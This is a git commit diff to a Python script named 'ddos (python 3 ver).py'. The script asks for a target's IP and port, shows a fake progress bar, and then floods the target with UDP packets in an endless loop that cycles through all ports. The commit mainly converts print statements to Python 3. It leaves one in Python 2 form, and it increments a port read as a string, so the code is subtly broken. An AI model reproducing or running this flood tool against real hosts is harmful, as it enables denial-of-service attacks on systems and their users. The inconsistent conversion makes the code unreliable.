70176a3d83143db00a5fc36b876affcff714fe37
Seyed Ali Javadi Moghadam <42797703+javadimoghadam@users.noreply.github.com>
2020-04-14 17:13:58 +0430

    Update ddos (python 3 ver).py

--- ddos (python 3 ver).py
+++ ddos (python 3 ver).py
@@ -19,21 +19,21 @@ ip = input("Target\'s IP : ")
 port = input("Port : ")
 os.system("clear")
 os.system("figlet Attack Starting")
-print "[                    ] 0% "
+print ("[                    ] 0% ")
 time.sleep(5)
-print "[=====               ] 25%"
+print ("[=====               ] 25%")
 time.sleep(5)
-print "[==========          ] 50%"
+print ("[==========          ] 50%")
 time.sleep(5)
-print "[===============     ] 75%"
+print ("[===============     ] 75%")
 time.sleep(5)
 print "[====================] 100%"
 time.sleep(3)
 sent = 0
 while True:
-     sock.sendto(bytes, (ip, port))
+     sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
+     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
      if port == 65534:
        port = 1
